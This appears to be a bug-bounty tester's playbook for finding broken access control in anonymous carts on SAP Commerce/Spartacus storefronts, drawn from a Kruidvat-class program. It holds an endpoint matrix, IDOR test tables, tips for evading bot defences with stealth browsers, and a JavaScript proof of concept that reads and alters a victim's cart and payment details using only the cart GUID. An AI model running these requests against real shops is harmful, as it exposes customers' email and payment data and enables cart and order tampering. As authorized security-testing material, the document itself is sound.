# SAP Commerce OCC / Spartacus — Anonymous Cart Authz

Session-derived patterns from AS Watson / Kruidvat-class e-com (Intigriti Tier-1). Reuse on any SAP Commerce Cloud + Spartacus storefront.

## Fingerprints
- Angular/Spartacus storefront, `data-beasties-container`
- OCC base: `/api/v2/{baseSiteId}/...`
- Common baseSite IDs: brand-specific SPA ids (examples: `kvn-spa`, `kvb-spa`, `kvtp`)
- `GET /api/v2/basesites?fields=FULL` → multi-brand site map
- `GET /api/v2/{base}/configurations/group` → public config (Adyen client key, API hosts)
- `GET /authorizationserver/.well-known/openid-configuration` → Commerce Cloud CDN host
- Response header: `occ-personalization-id`
- Akamai + often Queue-it / bot management on storefront

## Recon when DC IP is blocked
1. Do **not** thrash root `api.*` / `app.*` with raw curl — roots often 404; real API is under `/api/v2/{spa}/`.
2. Open storefront in stealth Chromium (CloakBrowser or equivalent).
3. Capture network: cart create, product search, config group, OAuth.
4. Download main JS chunks from page; extract `/api/v2/` paths and OAuth client names.
5. Rate ≤ program limit (example: 5 rps; sleep ~1s between heavy navigations).

## Anonymous cart capability-URL matrix
```
POST /api/v2/{spa}/users/anonymous/carts?fields=FULL&lang=..&curr=EUR
  → 201 { guid, code }

GET    .../carts/{guid}?fields=FULL
POST   .../carts/{guid}/entries          {"product":{"code":"SKU"},"quantity":1}
PUT    .../carts/{guid}/email?email=
POST   .../carts/{guid}/addresses/delivery
POST   .../carts/{guid}/addresses/billing     # often exists; same GUID authz as delivery
PUT    .../carts/{guid}/deliverymode?deliveryModeId=
PUT    .../carts/{guid}/deliverymode?deliveryModeId=...&deliverySlot={encodedValue}
GET    .../carts/{guid}/deliverymodes/{mode}/deliveryslots/{postal}?houseNumber=N
POST   .../carts/{guid}/paymentdetails        # unauth 201; PAN usually masked
PUT    .../carts/{guid}/paymentmode?paymentModeId=
POST   .../carts/{guid}/vouchers?voucherId=
DELETE .../carts/{guid}
POST   .../users/anonymous/orders?cartId={guid}&fields=FULL
```

### Authz tests (must run)
| Test | How | Bad outcome |
|------|-----|-------------|
| Cross-session read | New page / `credentials: omit` + victim GUID | 200 + cart + guest email |
| Write IDOR | Attacker POST entry / address / deliverymode | 200/201 mutates victim cart |
| Billing address IDOR | `POST .../addresses/billing` omit credentials | 201 |
| Paymentdetails IDOR | `POST .../paymentdetails` + GET cart `fields=paymentInfo(FULL)` | 201 then 200 masked PAN + holder + expiry |
| Delete IDOR | Attacker DELETE cart | 200, victim GET → Cart not found |
| Guest placeOrder authz | `POST .../orders?cartId={guid}` omit credentials | **400 validation** (not 401/403) = same capability model |
| Numeric code as id | GET cart / placeOrder by `code` not GUID | Usually 400 — not enumerable |
| Price manip | PATCH/POST entry with `basePrice: 0.01` | Server ignores → not free order |
| Cross-brand GUID | NL guid on BE host / other baseSiteId | Usually Cart not found (isolated) — still de-dupe report per shared stack |

## PlaceOrder + delivery-slot chain (post cart IDOR)
1. **Authz vs validation:** unauth placeOrder often fails with `PlaceOrderCartValidationError` / `ValidationError` (T&C, slot, address) — that is **not** access control. Record as chain extension if 401/403 never appears.
2. **T&C is often SPA-only:** Spartacus `setTermsAccepted` / NgRx `termsAccepted` may never hit OCC. Body/query probes (`termsCheck`, `termsAndConditionsAccepted`) are **unreliable** — sometimes flip error text only. Confirm with real checkout network capture before claiming T&C bypass.
3. **Slots path pattern (JS-mined):**  
   `GET users/${userId}/carts/${cartId}/deliverymodes/${deliveryModeId}/deliveryslots/${postalCode}?houseNumber=...`  
   Apply with `PUT .../deliverymode?deliveryModeId=...&deliverySlot={encodedValue}` (standalone `/deliveryslot` path may 404).
4. **Slot list may need verified address first** — expect `Delivery address verification failed` until delivery address is set; `houseNumber` query often required for 200 + `encodedValue` list.
5. **paymentAuthorizedOrderPlacement** path in JS may 405/not found for anonymous — do not assume free-order shortcut.
6. **Do not claim free paid goods** without Adyen/capture success. Authz-only guest placeOrder + validation bypass ≠ unpaid shipment.

## PII surface notes
- Guest email often in `user.uid` on cart GET even when deliveryAddress is stripped from FULL DTO.
- Address overwrite still returns full address object on POST 201 (attacker-controlled fields).
- **paymentInfo** on cart GET: masked PAN (`************1111`), `accountHolderName`, expiry, `cardType`; full PAN should not echo (if it does → higher sev).
- Client-supplied address `"id"` may be echoed on 201 (cart-scoped); no automatic cross-cart takeover without more proof.
- Cart GUID may **not** sit in `localStorage` active cart key (Spartacus key can be empty `active:""`); still lives in network + SPA state — hunt leak vectors separately (XSS, analytics, support).
- **RUM/analytics:** GUID often lands in Datadog/browser RUM **POST bodies** (public `pub...` client key). Useful as **secondary-leak narrative** only — not a standalone finding without third-party read proof.

## Severity / triage (capability URL)
- UUID v4 GUID: not practical to brute → triage may argue Medium without leak chain.
- Still valid broken access control if unauth R/W is proven: state-changing ops + guest email without session binding.
- Fold paymentInfo/billing/paymentmode into **one** cart-GUID report (same root cause) — elevates PII/checkout impact, do not split duplicate tickets.
- Guest placeOrder without 401: argue as **severity amplifier** for cart IDOR; only separate finding if order actually places + order-IDOR follows.
- Frame honestly: "GUID is only secret; no cookie/HMAC binding"; list realistic secondary leak paths; do not claim mass customer dump without enum proof.
- Program focus hits: API authorization, checkout/order abuse, customer data in e-com flows.
- Deduplicate across multi-brand OCC (NL/BE/sister brands) even when GUID is not cross-readable.

## Usually NOT findings
- Adyen `live_` client key in config API (public client key)
- OIDC discovery host fingerprint alone
- WP `/wp-json/wp/v2/users` username list if program OOS lists WordPress username disclosure
- Client-side price fields ignored by server
- Datadog/RUM public client key + GUID in first-party→Datadog traffic alone
- Guessed voucher codes returning `VoucherOperationError`
- Cross-brand cart isolation (Cart not found) — expected

## Next-chain after cart IDOR
1. GUID leak primitive (XSS, postMessage, third-party script, open redirect/referrer, RUM misconfig)
2. paymentdetails + billing + paymentInfo on same GUID (strengthen single report)
3. Guest placeOrder validation bypass (slot + T&C real SPA payload) → order read IDOR
4. Authenticated `/users/current/orders/{id}`, addresses, paymentdetails IDOR (`@program` test accounts)
5. Coupon / loyalty cheque race (needs valid voucher — don't burn time on blind guesses)
6. Mobile app OAuth client_id/secret in APK if apps in scope

## Minimal PoC skeleton (browser context)
```javascript
// Victim
const c = await fetch(`${API}/api/v2/${SPA}/users/anonymous/carts?fields=FULL`, {
  method: 'POST', credentials: 'include',
  headers: {'Content-Type':'application/json','Accept':'application/json'},
  body: '{}'
}).then(r => r.json());
const guid = c.guid;
// set email + address on cart...

// Attacker — no cookies
const leak = await fetch(`${API}/api/v2/${SPA}/users/anonymous/carts/${guid}?fields=FULL`, {
  credentials: 'omit', headers: {'Accept':'application/json'}
}).then(r => r.json());
// expect leak.user.uid === victim email

// paymentInfo extension
await fetch(`${API}/api/v2/${SPA}/users/anonymous/carts/${guid}/paymentdetails?fields=FULL`, {
  method: 'POST', credentials: 'omit',
  headers: {'Content-Type':'application/json','Accept':'application/json'},
  body: JSON.stringify({
    accountHolderName: 'Attacker', cardNumber: '4111111111111111',
    cardType: {code: 'visa'}, expiryMonth: '12', expiryYear: '2030', cvn: '123',
    billingAddress: {/* ... */}
  })
});
const pay = await fetch(
  `${API}/api/v2/${SPA}/users/anonymous/carts/${guid}?fields=paymentInfo(FULL),user(FULL)`,
  {credentials: 'omit', headers: {'Accept':'application/json'}}
).then(r => r.json());
// expect pay.paymentInfo.cardNumber masked + accountHolderName

// placeOrder authz probe (expect 400 validation, not 401)
const o = await fetch(
  `${API}/api/v2/${SPA}/users/anonymous/orders?cartId=${guid}&fields=FULL`,
  {method: 'POST', credentials: 'omit', headers: {'Content-Type':'application/json'}, body: '{}'}
);
// o.status === 400 PlaceOrderCartValidationError ⇒ no session binding on order create
```
